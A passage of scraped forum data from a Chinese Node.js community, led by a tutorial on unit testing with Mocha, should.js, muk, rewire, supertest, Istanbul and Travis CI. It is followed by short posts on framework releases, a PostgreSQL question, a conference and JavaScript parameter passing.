class=\"markdown-text\"><p>在团队合作中，你写好了一个函数，供队友使用，跑去跟你的队友说，你传个A值进去，他就会返回B结果了。过了一会，你队友跑过来说，我传个A值却返回C结果，怎么回事？你丫的有没有测试过啊？</p>\n<p>大家一起写个项目，难免会有我要写的函数里面依赖别人的函数，但是这个函数到底值不值得信赖？单元测试是衡量代码质量的一重要标准，纵观Github的受欢迎项目，都是有test文件夹，并且buliding-pass的。如果你也为社区贡献过module，想更多人使用的话，加上单元测试吧，让你的module值得别人信赖。</p>\n<p>要在Nodejs中写单元测试的话，你需要知道用什么测试框架，怎么测试异步函数，怎么测试私有方法，怎么模拟测试环境，怎么测试依赖HTTP协议的web应用，需要了解TDD和BDD，还有需要提供测试的覆盖率。</p>\n<blockquote>\n<p>本文的示例代码会备份到 Github : <a href=\"https://github.com/JerryC8080/unittest-demo\">unittest-demo</a></p>\n</blockquote>\n<h2>目录</h2>\n<ol>\n<li>测试框架</li>\n<li>断言库</li>\n<li>需求变更</li>\n<li>异步测试</li>\n<li>异常测试</li>\n<li>测试私有方法</li>\n<li>测试Web应用</li>\n<li>覆盖率</li>\n<li>使用Makefile把测试串起来</li>\n<li>持续集成，Travis-cli</li>\n<li>一些观点</li>\n<li>彩蛋</li>\n<li>整理</li>\n</ol>\n<h2>测试框架</h2>\n<p>Nodejs的测试框架还用说？大家都在用，Mocha。</p>\n<p>Mocha 是一个功能丰富的Javascript测试框架，它能运行在Node.js和浏览器中，支持<strong>BDD</strong>、<strong>TDD</strong>、<strong>QUnit</strong>、<strong>Exports</strong>式的测试，本文主要示例是使用更接近与思考方式的BDD，\b如果了解更多可以访问Mocha的<a href=\"http://mochajs.org/\">官网</a></p>\n<h4>\b</h4>\n<h4>测试接口</h4>\n<p>Mocha的BDD接口有：</p>\n<ul>\n<li><code>describe()</code></li>\n<li><code>it()</code></li>\n<li><code>before()</code></li>\n<li><code>after()</code></li>\n<li><code>beforeEach()</code></li>\n<li><code>afterEach()</code></li>\n</ul>\n<h4>安装</h4>\n<p><code>npm install mocha -g</code></p>\n<h4>编写一个稳定可靠的模块</h4>\n<p>模块具备limit方法，输入一个数值，小于0的时候返回0，其余正常返回</p>\n<pre class=\"prettyprint language- javascript\"><code>exports.limit = function (num) {\n  if (num &lt; 0) {\n    return 0;\n  }\n  return num;\n};\n</code></pre><h4>目录分配</h4>\n<ul>\n<li><code>lib</code>，存放模块代码的地方</li>\n<li><code>test</code>，存放单元测试代码的地方</li>\n<li><code>index.js</code>，向外导出模块的地方</li>\n<li><code>package.json</code>，包描述文件</li>\n</ul>\n<h4>测试</h4>\n<pre class=\"prettyprint language- javascript\"><code>var lib = require(&#x27;index&#x27;);\n\ndescribe(&#x27;module&#x27;, function () {\n  describe(&#x27;limit&#x27;, function () {\n    it(&#x27;limit should success&#x27;, function () {\n      lib.limit(10);\n    });\n  });\n});\n</code></pre><h4>结果</h4>\n<p>在当前目录下执行<code>mocha</code>：</p>\n<pre class=\"prettyprint language-\"><code>$ mocha\n\n  ․\n\n  ✔ 1 test complete (2ms)\n</code></pre><h2>断言库</h2>\n<p>上面的代码只是运行了代码，并没有对结果进行检查，这时候就要用到断言库了，Node.js中常用的断言库有：</p>\n<ul>\n<li>should.js</li>\n<li>expect.js</li>\n<li>chai</li>\n</ul>\n<h4>加上断言</h4>\n<p>使用<code>should</code>库为测试用例加上断言</p>\n<pre class=\"prettyprint language- javascript\"><code>it(&#x27;limit should success&#x27;, function () {\n  lib.limit(10).should.be.equal(10);\n});\n</code></pre><h2>\b需求变更</h2>\n<p>需求变更啦： <code>limit</code>这个方法还要求返回值大于100时返回100。</p>\n<p>针对需求重构代码之后，正是测试用例的价值所在了，</p>\n<p>它能确保你的改动对原有成果没有造成破坏。</p>\n<p>但是，你要多做的一些工作的是，需要为新的需求编写新的测试代码。</p>\n<h2>异步测试</h2>\n<h4>测试异步回调</h4>\n<p>lib库中新增async函数：</p>\n<pre class=\"prettyprint language- javascript\"><code>exports.async = function (callback) {\n  setTimeout(function () {\n    callback(10);\n  }, 10);\n};\t\n</code></pre><p>测试异步代码：</p>\n<pre class=\"prettyprint language- javascript\"><code>describe(&#x27;async&#x27;, function () {\n  it(&#x27;async&#x27;, function (done) {\n    lib.async(function (result) {\n      done();\n    });\n  });\n});\n</code></pre><h4>测试Promise</h4>\n<p>使用should提供的Promise断言接口:</p>\n<ul>\n<li><code>finally</code> | <code>eventually</code></li>\n<li><code>fulfilled</code></li>\n<li><code>fulfilledWith</code></li>\n<li><code>rejected</code></li>\n<li><code>rejectedWith</code></li>\n<li><code>then</code></li>\n</ul>\n<p>测试代码</p>\n<pre class=\"prettyprint language- javascript\"><code>describe(&#x27;should&#x27;, function () {\n  describe(&#x27;#Promise&#x27;, function () {\n    it(&#x27;should.reject&#x27;, function () {\n      (new Promise(function (resolve, reject) {\n        reject(new Error(&#x27;wrong&#x27;));\n      })).should.be.rejectedWith(&#x27;wrong&#x27;);\n    });\n\n    it(&#x27;should.fulfilled&#x27;, function () {\n      (new Promise(function (resolve, reject) {\n        resolve({username: &#x27;jc&#x27;, age: 18, gender: &#x27;male&#x27;})\n      })).should.be.fulfilled().then(function (it) {\n          it.should.have.property(&#x27;username&#x27;, &#x27;jc&#x27;);\n        })\n    });\n  });\n});\n</code></pre><h4>异步方法的超时支持</h4>\n<p>Mocha的超时设定默认是2s，如果执行的测试超过2s的话，就会报timeout错误。</p>\n<p>可以主动修改超时时间，有两种方法。</p>\n<h4>命令行式</h4>\n<p><code>mocha -t 10000</code></p>\n<h4>API式</h4>\n<pre class=\"prettyprint language- javascript\"><code>describe(&#x27;async&#x27;, function () {\n  this.timeout(10000);\n  it(&#x27;async&#x27;, function (done) {\n    lib.async(function (result) {\n      done();\n    });\n  });\n});\n</code></pre><p>这样的话<code>async</code>执行时间不超过10s，就不会报错timeout错误了。</p>\n<h2>异常测试</h2>\n<p>异常应该怎么测试，现在有<code>getContent</code>方法，他会读取指定文件的内容，但是不一定会成功，会抛出异常。</p>\n<pre class=\"prettyprint language- javascript\"><code>exports.getContent = function (filename, callback) {\n  fs.readFile(filename, &#x27;utf-8&#x27;, callback);\n};\n</code></pre><p>这时候就应该模拟(mock)错误环境了</p>\n<h4>简单Mock</h4>\n<pre class=\"prettyprint language- javascript\"><code>describe(&quot;getContent&quot;, function () {\n  var _readFile;\n  before(function () {\n    _readFile = fs.readFile;\n    fs.readFile = function (filename, encoding, callback) {\n      process.nextTick(function () {\n        callback(new Error(&quot;mock readFile error&quot;));\n      });\n    };\t\n  });\n  &#x2F;&#x2F; it();\n  after(function () {\n    &#x2F;&#x2F; 用完之后记得还原。否则影响其他case\n    fs.readFile = _readFile;\n  })\n});\n</code></pre><h4>\bMock库</h4>\n<p>Mock小模块：<a href=\"https://github.com/fent/node-muk\"><code>muk</code></a> ，略微优美的写法：</p>\n<pre class=\"prettyprint language- javascript\"><code>var fs = require(&#x27;fs&#x27;);\nvar muk = require(&#x27;muk&#x27;);\n\nbefore(function () {\n  muk(fs, &#x27;readFile&#x27;, function(path, encoding, callback) {\n    process.nextTick(function () {\n      callback(new Error(&quot;mock readFile error&quot;));\n    });\n  });\n});\n&#x2F;&#x2F; it();\nafter(function () {\n  muk.restore();\n});\n</code></pre><h2>测试私有方法</h2>\n<p>针对一些内部的方法，没有通过exports暴露出来，怎么测试它？</p>\n<pre class=\"prettyprint language- javascript\"><code>function _adding(num1, num2) {\n  return num1 + num2;\n}\n</code></pre><h4>通过rewire导出方法</h4>\n<p>模块：<a href=\"http://jhnns.github.com/rewire/\"><code>rewire</code></a></p>\n<pre class=\"prettyprint language-\"><code>it(&#x27;limit should return success&#x27;, function () {\n  var lib = rewire(&#x27;..&#x2F;lib&#x2F;index.js&#x27;);\n  var litmit = lib.__get__(&#x27;limit&#x27;);\n  litmit(10);\n});\n</code></pre><h2>测试Web应用</h2>\n<p>在开发Web项目的时候，要测试某一个API，如：<code>/user</code>，到底怎么编写测试用例呢？</p>\n<p>使用：<a href=\"https://github.com/visionmedia/supertest\"><code>supertest</code></a></p>\n<pre class=\"prettyprint language- javascript\"><code>var express = require(&quot;express&quot;);\nvar request = require(&quot;supertest&quot;);\nvar app = express();\n\n&#x2F;&#x2F; 定义路由\napp.get(&#x27;&#x2F;user&#x27;, function(req, res){\n  res.send(200, { name: &#x27;jerryc&#x27; });\n});\n\ndescribe(&#x27;GET &#x2F;user&#x27;, function(){\n  it(&#x27;respond with json&#x27;, function(done){\n    request(app)\n      .get(&#x27;&#x2F;user&#x27;)\n      .set(&#x27;Accept&#x27;, &#x27;application&#x2F;json&#x27;)\n      .expect(&#x27;Content-Type&#x27;, &#x2F;json&#x2F;)\n      .expect(200)\n      .end(function (err, res) {\n        if (err){\n          done(err);\n        }\n        res.body.name.should.be.eql(&#x27;jerryc&#x27;);\n        done();\n      })\n  });\n});\n</code></pre><h2>覆盖率</h2>\n<p>测试的时候，我们常常关心，是否所有代码都测试到了。</p>\n<p>这个指标就叫做<a href=\"http://en.wikipedia.org/wiki/Code_coverage\">&quot;代码覆盖率&quot;</a>（code coverage）。它有四个测量维度。</p>\n<blockquote>\n<ul>\n<li><strong>行覆盖率</strong>（line coverage）：是否每一行都执行了？</li>\n<li><strong>函数覆盖率</strong>（function coverage）：是否每个函数都调用了？</li>\n<li><strong>分支覆盖率</strong>（branch coverage）：是否每个if代码块都执行了？</li>\n<li><strong>语句覆盖率</strong>（statement coverage）：是否每个语句都执行了？</li>\n</ul>\n</blockquote>\n<p><a href=\"https://github.com/gotwarlost/istanbul\">Istanbul</a> 是 JavaScript 程序的代码覆盖率工具。</p>\n<h4>安装</h4>\n<p><code>$ npm install -g istanbul</code></p>\n<h4>覆盖率测试</h4>\n<p>在编写过以上的测试用例之后，执行命令：</p>\n<p><code>istanbul cover _mocha</code></p>\n<p>就能得到覆盖率:</p>\n<pre class=\"prettyprint language- javascript\"><code>JerryC% istanbul cover _mocha                                                                                                                                                                \n\n\n  module\n    limit\n      ✓ limit should success\n    async\n      ✓ async\n    getContent\n      ✓ getContent\n    add\n      ✓ add\n\n  should\n    #Promise\n      ✓ should.reject\n      ✓ should fulfilled\n\n\n  6 passing (32ms)\n\n\n================== Coverage summary ======================\nStatements   : 100% ( 10&#x2F;10 )\nBranches     : 100% ( 2&#x2F;2 )\nFunctions    : 100% ( 5&#x2F;5 )\nLines        : 100% ( 10&#x2F;10 )\n==========================================================\n</code></pre><p>这条命令同时还生成了一个 coverage 子目录，其中的 coverage.json 文件包含覆盖率的原始数据，coverage/lcov-report 是可以在浏览器打开的覆盖率报告，其中有详细信息，到底哪些代码没有覆盖到。</p>\n<p><img src=\"http://xia-dev.b0.upaiyun.com/eac87dbf-4e4b-426e-80ac-7c50e1b9a1cb.jpg\" alt=\"覆盖率html\"></p>\n<p>上面命令中，<code>istanbul cover</code> 命令后面跟的是 <code>_mocha</code> 命令，前面的下划线是不能省略的。</p>\n<p>因为，<a href=\"https://github.com/gotwarlost/istanbul/issues/44\">mocha 和 _mocha 是两个不同的命令</a>，前者会新建一个进程执行测试，而后者是在当前进程（即 istanbul 所在的进程）执行测试，只有这样， istanbul 才会捕捉到覆盖率数据。其他测试框架也是如此，必须在同一个进程执行测试。</p>\n<p>如果要向 mocha 传入参数，可以写成下面的样子。</p>\n<pre class=\"prettyprint language-\"><code>$ istanbul cover _mocha -- tests&#x2F;test.sqrt.js -R spec\n</code></pre><p>上面命令中，两根连词线后面的部分，都会被当作参数传入 Mocha 。如果不加那两根连词线，它们就会被当作 istanbul 的参数（参考链接<a href=\"http://www.clock.co.uk/blog/npm-module-code-coverage-in-2-simple-steps\">1</a>，<a href=\"http://www.vapidspace.com/coding/2014/10/29/code-coverage-metrics-with-mocha-and-istanbul/\">2</a>）。</p>\n<h2>使用Makefile串起项目</h2>\n<pre class=\"prettyprint language-\"><code>TESTS = test&#x2F;*.test.js\nREPORTER = spec\nTIMEOUT = 10000\nJSCOVERAGE = .&#x2F;node_modules&#x2F;jscover&#x2F;bin&#x2F;jscover\n\ntest:\n    @NODE_ENV=test .&#x2F;node_modules&#x2F;mocha&#x2F;bin&#x2F;mocha -R $(REPORTER) -t $(TIMEOUT) $(TESTS)\n\ntest-cov: lib-cov\n    @LIB_COV=1 $(MAKE) test REPORTER=dot\n    @LIB_COV=1 $(MAKE) test REPORTER=html-cov &gt; coverage.html\n\nlib-cov:\n    @rm -rf .&#x2F;lib-cov\n    @$(JSCOVERAGE) lib lib-cov\n\n.PHONY: test test-cov lib-cov\n\nmake test\nmake test-cov\n\n</code></pre><p>用项目自身的jscover和mocha，避免版本冲突和混乱</p>\n<h2>持续集成，Travis-cli</h2>\n<ul>\n<li><a href=\"https://travis-ci.org/\">Travis-ci</a>\n<ul>\n<li>绑定Github帐号</li>\n<li>在Github仓库的Admin打开Services hook</li>\n<li>打开Travis</li>\n<li>每次push将会hook触发执行<code>npm test</code>命令</li>\n</ul>\n</li>\n</ul>\n<p>注意：Travis会将未描述的项目当作Ruby项目。所以需要在根目录下加入<code>.travis.yml</code>文件。内容如下：</p>\n<pre class=\"prettyprint language- yaml\"><code>language: node_js\nnode_js:\n  - &quot;0.12&quot;\n</code></pre><p>Travis-cli还会对项目颁发标签，</p>\n<p><img src=\"https://camo.githubusercontent.com/f479d6cf4ac300093da5a90d70565cebf8c8ed40/68747470733a2f2f7365637572652e7472617669732d63692e6f72672f4a61636b736f6e5469616e2f626167706970652e706e67\" alt=\"/\">or <img src=\"https://camo.githubusercontent.com/08478cd5a732822aec47e6e60d5f823ef0898dec/68747470733a2f2f7365637572652e7472617669732d63692e6f72672f54424544502f64617461766a732e706e67\" alt=\"/\"></p>\n<p>如果项目通过所有测试，就会build-passing，</p>\n<p>如果项目没有通过所有测试，就会build-failing</p>\n<h2>一些观点</h2>\n<p>实施单元测试的时候, 如果没有一份经过实践证明的详细规范, 很难掌握测试的 “度”, 范围太小施展不开, 太大又侵犯 “别人的” 地盘. 上帝的归上帝, 凯撒的归凯撒, 给单元测试念念紧箍咒不见得是件坏事, 反而更有利于发挥单元测试的威力, 为代码重构和提高代码质量提供动力.</p>\n<p>这份文档来自 Geotechnical, 是一份非常难得的经验准则. 你完全可以以这份准则作为模板, 结合所在团队的经验, 整理出一份内部单元测试准则.</p>\n<p><a href=\"https://github.com/yangyubo/zh-unit-testing-guidelines\">单元测试准则</a></p>\n<h2>彩蛋</h2>\n<p>最后，介绍一个库：<a href=\"https://github.com/Marak/Faker.js\"><code>faker</code></a></p>\n<p>他是一个能伪造用户数据的库，包括用户常包含的属性：个人信息、头像、地址等等。</p>\n<p>是一个开发初期，模拟用户数据的绝佳好库。</p>\n<p>支持Node.js和浏览器端。</p>\n<p><img src=\"http://xia-dev.b0.upaiyun.com/43075e5e-026f-4acb-a51f-a998cf1a6e11.jpg\" alt=\"生成用户\"></p>\n<h2>整理</h2>\n<h4>Nodejs的单元测试工具</h4>\n<ol>\n<li>测试框架 mocha</li>\n<li>断言库：should.js、expect.js、chai</li>\n<li>覆盖率：istanbul、jscover、blanket</li>\n<li>Mock库：muk</li>\n<li>测试私有方法：rewire</li>\n<li>Web测试：supertest</li>\n<li>持续集成：Travis-cli</li>\n</ol>\n<h2>参考</h2>\n<ul>\n<li><a href=\"https://github.com/JacksonTian/unittesting\">https://github.com/JacksonTian/unittesting</a></li>\n<li><a href></a><a href=\"http://html5ify.com/unittesting/slides/index.html\">http://html5ify.com/unittesting/slides/index.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/06/istanbul.html\">http://www.ruanyifeng.com/blog/2015/06/istanbul.html</a></li>\n<li><a href=\"http://coolshell.cn/articles/8209.html\">http://coolshell.cn/articles/8209.html</a></li>\n<li><a href=\"http://stackoverflow.com/questions/153234/how-deep-are-your-unit-tests\">http://stackoverflow.com/questions/153234/how-deep-are-your-unit-tests</a></li>\n<li><a href=\"https://github.com/yangyubo/zh-unit-testing-guidelines\">https://github.com/yangyubo/zh-unit-testing-guidelines</a></li>\n<li><a href=\"http://www.codedata.com.tw/java/unit-test-the-way-changes-my-programming\">http://www.codedata.com.tw/java/unit-test-the-way-changes-my-programming</a></li>\n<li><a href=\"http://wiki.ubuntu.org.cn/%E8%B7%9F%E6%88%91%E4%B8%80%E8%B5%B7%E5%86%99Makefile:MakeFile%E4%BB%8B%E7%BB%8D\">http://wiki.ubuntu.org.cn/%E8%B7%9F%E6%88%91%E4%B8%80%E8%B5%B7%E5%86%99Makefile:MakeFile%E4%BB%8B%E7%BB%8D</a></li>\n<li><a href=\"https://github.com/yangyubo/zh-unit-testing-guidelines\">https://github.com/yangyubo/zh-unit-testing-guidelines</a></li>\n<li><a href=\"https://github.com/visionmedia/superagent/blob/master/Makefile\">https://github.com/visionmedia/superagent/blob/master/Makefile</a></li>\n</ul>\n</div>","title":"在Nodejs中贯彻单元测试","last_reply_at":"2019-01-02T05:49:02.119Z","good":true,"top":false,"reply_count":68,"visit_count":26748,"create_at":"2015-07-30T09:03:49.843Z","author":{"loginname":"JerryC8080","avatar_url":"https://avatars0.githubusercontent.com/u/6801672?v=4&s=120"}},{"id":"5be7ce7f21d75b74609f628a","author_id":"560b3a2848055cd15e2c8957","tab":"share","content":"<div class=\"markdown-text\"><p>NutzWk 5.1.0 Vue版本已发布，演示地址： <a href=\"https://nutzwk.wizzer.cn\">https://nutzwk.wizzer.cn</a></p>\n<p>源码Github：<a href=\"https://github.com/Wizzercn/NutzWk\">https://github.com/Wizzercn/NutzWk</a>\n码云Gitee：<a href=\"https://gitee.com/wizzer/NutzWk\">https://gitee.com/wizzer/NutzWk</a></p>\n<p>本次更新内容：</p>\n<ul>\n<li>wk-nb-web-vue 新增全新的Vue后台管理界面，基于Vue.js + Element.js 等，增强交互体验；</li>\n<li>基础服务类 BaseService 新增一些常用的查询方法；</li>\n<li>微信模块增加图片自动回复、群发图片、微信菜单可配小程序等功能；</li>\n<li>CMS模块增加前台模板标签示例代码；</li>\n<li>增强Oracle及MySQL兼容性；</li>\n<li>支持Openjdk 11；</li>\n</ul>\n<p>后端技术架构：java nutzboot + dubbo + zookeeper\n前端技术架构：vue.js + element.js + bootstrap</p>\n</div>","title":"NutzWk 5.1.0 微服务开发框架，Vue版本已发布","last_reply_at":"2019-01-02T05:46:11.940Z","good":false,"top":false,"reply_count":3,"visit_count":1513,"create_at":"2018-11-11T06:38:55.029Z","author":{"loginname":"Wizzercn","avatar_url":"https://avatars0.githubusercontent.com/u/2408114?v=4&s=120"}},{"id":"5c2989183898674067a79cbf","author_id":"57637029c13e1e492222bd2d","tab":"share","content":"<div class=\"markdown-text\"><p>不知不觉中，2018年马上就结束了，一年时间里YApi 从一个几百 star 小项目到目前有上千家公司部署，Gihub Star 5000+。感觉大家的支持和对我们的信任，我们会再接再厉，持续维护和更新下去。\n<img src=\"//static.cnodejs.org/FkrgJ_Fcuty_nQ08b3vNO4zhzDyT\" alt=\"image.png\"></p>\n<p>v1.4.3 新增如下功能：</p>\n<ul>\n<li>支持了 swagger 导出功能</li>\n<li>支持了克隆测试用例</li>\n<li>支持任何人都可以添加分组，只有管理员才能修改项目是否公开</li>\n<li>支持 mongodb 集群</li>\n</ul>\n<blockquote>\n<p>另外，从 v1.4.3 开始，部署文件由原来公司服务器切换到淘宝npm，<a href=\"https://registry.npm.taobao.org/yapi-vendor%EF%BC%8C\">https://registry.npm.taobao.org/yapi-vendor，</a>\n如果你部署的服务依赖部署文件下载地址，记得及时更新。</p>\n</blockquote>\n<h2>更新方法</h2>\n<p>更新之前，首先需要升级 **yapi-cli **工具到最新的 <strong>1.4.0</strong> 版本！</p>\n<pre class=\"prettyprint language-bash\"><code>npm install -g yapi-cli@1.4.0\n\n</code></pre><p>然后在项目目录执行：</p>\n<pre class=\"prettyprint language-bash\"><code>yapi-cli update\n\n</code></pre><p>Github: <a href=\"https://github.com/YMFE/yapi\">https://github.com/YMFE/yapi</a></p>\n</div>","title":"开源接口管理平台YApi v1.4.3 元旦发布","last_reply_at":"2019-01-02T05:42:44.852Z","good":false,"top":false,"reply_count":1,"visit_count":810,"create_at":"2018-12-31T03:12:24.840Z","author":{"loginname":"suxiaoxin","avatar_url":"https://avatars0.githubusercontent.com/u/17695103?v=4&s=120"}},{"id":"5bf7c4986718ed3ca074c2de","author_id":"58d83c586f8b9bf02d1d0b1d","tab":"ask","content":"<div class=\"markdown-text\"><p>有和我一样惨的么<img src=\"//static.cnodejs.org/FhI1p28VzNyb_5Q4pI758tETVwCn\" alt=\"QQ截图20181123171235.png\">\n我一直以为技术积累到一定程度就不可能写出bug\n就像写div标签一样简单</p>\n</div>","title":"写了三年前端后端。还会写出bug","last_reply_at":"2019-01-02T01:49:13.846Z","good":false,"top":false,"reply_count":9,"visit_count":2037,"create_at":"2018-11-23T09:12:56.388Z","author":{"loginname":"ResJay","avatar_url":"https://avatars0.githubusercontent.com/u/26635410?v=4&s=120"}},{"id":"5c2a1dfb3898674067a79dea","author_id":"5b376dfcac8bc1e124114500","tab":"ask","content":"<div class=\"markdown-text\"><p>最近在用postgresql 遇到选择数据结构困难\n大家用 postgresql 大多数使用 JSOB 还是 传统的 int，varchar…？理由？和有什么好处？\n比如 用JSONB 栗子🌰\nPerson</p>\n<ul>\n<li>uuid: STRNG</li>\n<li>data: JSONB  // 在这里保存全部的资料</li>\n</ul>\n<p>比如 用传统type 栗子🌰\nPerson</p>\n<ul>\n<li>uuid: STRNG</li>\n<li>email: STRNG</li>\n<li>name: STRIMG\n…</li>\n</ul>\n</div>","title":"postgresql 传统 Type 还是 JSONB？","last_reply_at":"2019-01-02T01:48:28.882Z","good":false,"top":false,"reply_count":3,"visit_count":791,"create_at":"2018-12-31T13:47:39.062Z","author":{"loginname":"tmirun","avatar_url":"https://avatars1.githubusercontent.com/u/8052536?v=4&s=120"}},{"id":"5c0bdc087ec239239ff54e91","author_id":"5bc9f0ca9545eaf107b9ccdd","tab":"ask","content":"<div class=\"markdown-text\"><p>要怎么学习</p>\n</div>","title":"关于css3弹性布局如何学习","last_reply_at":"2018-12-30T08:39:34.581Z","good":false,"top":false,"reply_count":3,"visit_count":1077,"create_at":"2018-12-08T14:58:16.953Z","author":{"loginname":"hhffhh","avatar_url":"https://avatars0.githubusercontent.com/u/3991376?v=4&s=120"}},{"id":"5c052988d3b8ab334e8da370","author_id":"559a6b4ad488d37a762532a2","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://gw.alipayobjects.com/mdn/afts/img/A*lvcKToPvH0EAAAAAAAAAAABjARQnAQ/original?bz=rms\" alt=\"banner\"></p>\n<p>SEE = Seeking Experience &amp; Engineering，意为探索用户体验与工程实践，由蚂蚁金服集团举办，包括专业分享、产品展台、Workshop 等内容。我们希望通过 SEE Conf，能与业界同行一起分享交流体验科技的当前进展，一起探讨切磋体验科技的未来发展，共同努力促进体验设计与技术的开放，让生态繁荣共赢。</p>\n<p>继首届 SEE Conf 成功举办后，第二届 SEE Conf 将于 2019.01.05（周六）在浙江杭州的蚂蚁 Z 空间举办。</p>\n<p>这次我们邀请来同济大学娄永琪院长和浙江大学王锐教授带我们走入学术前沿，还有大量蚂蚁金服体验科技相关的主题分享，期待你来参与。</p>\n<p><a href=\"https://seeconf.antfin.com?from=cnode\">立即报名</a></p>\n<h2>会议日程</h2>\n<h4>主会场</h4>\n<ul>\n<li>9:00 - 9:15：开幕致辞</li>\n<li>9:15 - 10:15：交互设计与人类未来</li>\n<li>10:05 - 11:00：Ant Design 情感化设计</li>\n<li>11:15 - 12:00：科技与人文结合的体验度量</li>\n<li>12:00 - 14:00：午餐时间</li>\n<li>14:00 - 14:45：实时绘制的过去、现在与将来</li>\n<li>15:00 - 15:45：数据可视化之 Story Telling</li>\n<li>15:45 - 16:15：活动 / 茶歇</li>\n<li>16:15 - 17:00：蚂蚁金服前端框架探索之路</li>\n<li>17:15 - 18:00：蚂蚁庄园背后的技术与思考</li>\n</ul>\n<h4>分会场</h4>\n<ul>\n<li>14:00 - 15:45：Workshop：Ant Design 资产一起造</li>\n<li>15:45 - 16:15：活动 / 茶歇</li>\n<li>16:15 - 18:00：圆桌沙龙：Ant Designers 面对面</li>\n</ul>\n<p><img src=\"https://gw.alipayobjects.com/mdn/afts/img/A*G_5DSoWbN1kAAAAAAAAAAABjARQnAQ/original?bz=rms\" alt=\"poster\"></p>\n<h2>大会看点</h2>\n<p>过去 40 年中国从物质极度匮乏时代迅速发展为物质过剩的时代，经济快速发展的同时，一方面带来了巨大的经济成就，另一方面也带来了大量可持续发展的问题。那么体验和设计，是否是开启未来人类可持续发展的金钥匙呢？本次我们非常荣幸邀请到同济大学设计与创意学院 <a href=\"https://baike.baidu.com/item/%E5%A8%84%E6%B0%B8%E7%90%AA\">娄永琪</a> 院长，为大家带来交互设计与人类未来的相关探索。</p>\n<p>技术是人类快速改造世界的手段，学术研究是技术发展的基石和前沿。在计算机上呈现一个高真实感的虚拟世界，是人们长久以来的一个梦想，而实时绘制技术则是其中的核心技术。本届大会我们荣幸的邀请到浙江大学计算机科学与技术学院 <a href=\"http://www.cad.zju.edu.cn/home/rwang/\">王锐</a> 教授，为我们揭开实时绘制技术的神秘面纱。</p>\n<p>没有度量，就没有优化。提升体验是大家共同的使命和目标，但长久以来，如何评估体验是困扰体验技术人的最大难题之一。本次蚂蚁金服数据可视化部负责人 御术 将为大家带来蚂蚁金服体验技术部在这个方向上的探索。</p>\n<p>蚂蚁企业级前端框架 <a href=\"https://github.com/umijs\">UmiJS</a> 正式上线 9 个月，在 Github 收获了 3,000 个 star，作为目前在蚂蚁内最流行的前端框架。从 Redux 到 <a href=\"https://github.com/dvajs\">DvaJS</a> 再到 UmiJS ，它背后的思考是什么？坑是什么？收获是什么？</p>\n<p>多年前知名媒体人柴静，一场《穹顶之下》发布会，引爆了中国社会对于雾霾的热烈讨论。会后很多媒体人会探究为何那次调查发布会有如此的感染力？各大媒体都纷纷总结出用大量的数据可视化的形式说故事，这让论点不但有理，而且有据。本次，我们邀请了蚂蚁金服数据可视化专家（前新华社技术总监）米法为大家带来，数据可视化之 story telling 的相关分享。</p>\n<p>蚂蚁庄园作为支付宝 UV 千万级别的超级应用，开发者在开发过程中，精心打磨产品，追求极致体验。那么，它背后的技术是什么呢？产品的心智是什么？这只小鸡又是怎么一步一步，从雏鸟长成雄鹰的呢？</p>\n<p><a href=\"https://ant.design/\">Ant Design</a> 是蚂蚁金服的明星产品，过去 1 年 Github 的 star 数翻番到达 36,000+，在本届大会原班人马带我们近距离立体式观察它，看如何通过 Ant Design 的情感化设计完善企业级产品。值得一提的是，本次大会除了主会场的报告外，我们还另外开辟分会场让大家有机会零距离跟 Ant Design 设计师一起对它展开探讨。</p>\n<h2>如何报名</h2>\n<p>访问 <a href=\"https://seeconf.antfin.com?from=cnode\">SEE Conf · 蚂蚁金服体验科技大会</a> ，点击「立即报名」按钮</p>\n</div>","title":"第二届蚂蚁金服体验科技大会将于19年1月5日举行，期待与你相遇","last_reply_at":"2018-12-30T08:05:09.523Z","good":false,"top":false,"reply_count":18,"visit_count":4241,"create_at":"2018-12-03T13:03:04.128Z","author":{"loginname":"vagusX","avatar_url":"https://avatars3.githubusercontent.com/u/6828924?v=4&s=120"}},{"id":"5c25ca4276c4964062a1eb0c","author_id":"5c23175d3898674067a788be","tab":"ask","content":"<div class=\"markdown-text\"><p>下面是代码</p>\n<pre class=\"prettyprint language-js\"><code>function setName(obj) {\n    obj.name = &#x27;Harry&#x27;;\n\n    obj = new Object();\n    obj.name = &#x27;Lucy&#x27;;\n}\n\n\nvar person = new Object();\nperson.name = &#x27;Bob&#x27;;\nsetName(person);\nconsole.log(person.name);\n</code></pre><p>引用变量作为函数参数的时候，是值的复制还是引用的复制。在《JavaScript高级程序设计》第四章第一节中讲的知识点是。无论是引用类型还是基本类型，在函数的参数中都是按照值传递的？但是从我的角度来看，JavaScript中引用变量作为参数也是以引用的方式传递的。他们的内存地址也是相同的。</p>\n<p>我的问题是，JavaScript中引用变量作为函数参数的时候，这个参数是以值传递的，还是以引用的方式传递的？</p>\n</div>","title":"JavaScript引用变量作为函数参数的相关问题?","last_reply_at":"2018-12-29T10:35:57.455Z","good":false,"top":false,"reply_count":7,"visit_count":798,"create_at":"2018-12-28T07:01:22.247Z","author":{"loginname":"BIXIAOJIE","avatar_url":"https://avatars2.githubusercontent.com/u/18553398?v=4&s=120"}},{"id":"5c2747033898674067a79a79","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<blockquote>\n<p>作者介绍：练小习，2011年加入搜狐，负责搜狐相册的产品策划与前端开发。2015年后加入腾讯 ISUX (社交用户体验设计部)，目前主要负责腾讯云的UI开发工作，专注于人机交互，有丰富的UI开发经验。</p>\n</blockquote>\n<p>这段时间有幸加入了一个关于微信小程序的项目开发组，从无到有的根据文档自行学习了小程序的开发过程，前面已经有几位前辈的文章珠玉在前，我这里就先从前端界面的开发方面谈一谈小程序以及我所遇到的问题吧。</p>\n<p>在结构和样式方面，小程序提供了一些常用的标签与控件，比如：</p>\n<p>view，小程序主要的布局元素，类似于html标签的div，你也完全可以像控制div那样去控制view。</p>\n<p>scroll-view，你要滚动内容的话，没必要用view去做overflow，scroll-view提供了更为强大的功能，通过参数的调整，你可以控制滚动方向，触发的事件等等</p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/725750e45c3cafe93ce96e3b4be0c884/image.png\" alt=\"img\"></p>\n<p><img src=\"https://mc.qcloudimg.com/static/img/723eb37abbe87649188830e471b5c97b/image.png\" alt=\"img\"></p>\n<p>swiper，滑块视图容器，对于新手来说，再也不用为选用哪个滚动插件伤脑筋了</p>\n<p><img 